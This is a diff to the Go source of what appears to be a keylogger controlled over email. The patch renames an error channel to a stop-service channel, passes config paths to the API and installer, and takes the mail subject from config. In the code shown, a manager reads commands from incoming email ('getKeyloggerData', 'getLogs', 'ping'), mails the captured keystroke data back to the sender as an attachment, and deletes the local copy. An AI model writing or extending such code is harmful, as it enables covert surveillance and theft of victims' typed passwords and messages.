@@ -20,7 +20,7 @@ import (
 /*
 Create <Manager> - init Manager structure
 	Returns <*Manager>:
-		1. Structure pointer
+		1. object's pointer
 	Args:
 		1. cfg <config.Cfg> - service's config
 */
@@ -29,10 +29,10 @@ func (m *Manager) Create(cfg config.Cfg) *Manager {
 		lc:            "MANAGER",
 		klInst:        new(keylogger.Keylogger).Create(),
 		mailInst:      new(mail.Mail).Create(),
-		apiInst:       new(api.Api).Create(cfg),
-		installerInst: new(installer.Installer).Create(cfg),
+		apiInst:       new(api.Api).Create(cfg.Zipper.Path, cfg.Logger.Path, cfg.Keylogger.Path),
+		installerInst: new(installer.Installer).Create(cfg.Keylogger.Path, cfg.Installer),
 		cfg:           cfg,
-		chCritError:   make(chan bool, 1),
+		chStopService: make(chan bool, 1),
 	}
 
 	return m
@@ -45,7 +45,7 @@ func (m *Manager) Run() {
 	go m.errorHandler()
 
 	if m.installerInst.Run() {
-		m.chCritError <- true
+		m.chStopService <- true
 		return
 	}
 
@@ -65,21 +65,21 @@ func (m *Manager) Run() {
 func (m *Manager) errorHandler() {
 	select {
 	case <-m.mailInst.GetChCritError():
-		m.chCritError <- true
+		m.chStopService <- true
 		return
 	case <-m.klInst.GetChCritError():
-		m.chCritError <- true
+		m.chStopService <- true
 		return
 	}
 }
 
 /*
-GetChCritError <Manager> - getting the channel of the critical error Manager
+GetChStopService <Manager> - getting the service stop event channel
 	Returns <<-chan bool>:
-		1. error's channel
+		1. event's channel
 */
-func (m *Manager) GetChCritError() <-chan bool {
-	return m.chCritError
+func (m *Manager) GetChStopService() <-chan bool {
+	return m.chStopService
 }
 
 // mailHandler - checking new data from incoming messages
@@ -123,15 +123,15 @@ func (m *Manager) task(body []byte, from string) {
 
 		if method == "getKeyloggerData" {
 			msg, path := m.apiInst.GetKeyloggerData(method)
-			m.mailInst.Send(from, "Subject", msg, path)
+			m.mailInst.Send(from, m.cfg.Mail.SMTP.Subject, msg, path)
 			os.Remove(path)
 		} else if method == "getLogs" {
 			msg, path := m.apiInst.GetLogs(method)
-			m.mailInst.Send(from, "Subject", msg, path)
+			m.mailInst.Send(from, m.cfg.Mail.SMTP.Subject, msg, path)
 			os.Remove(path)
 		} else if method == "ping" {
 			msg, path := m.apiInst.Ping(method)
-			m.mailInst.Send(from, "Subject", msg, path)
+			m.mailInst.Send(from, m.cfg.Mail.SMTP.Subject, msg, path)
 		} else {
 			err := errors.New(fmt.Sprint("Unknown method: ", method))
 
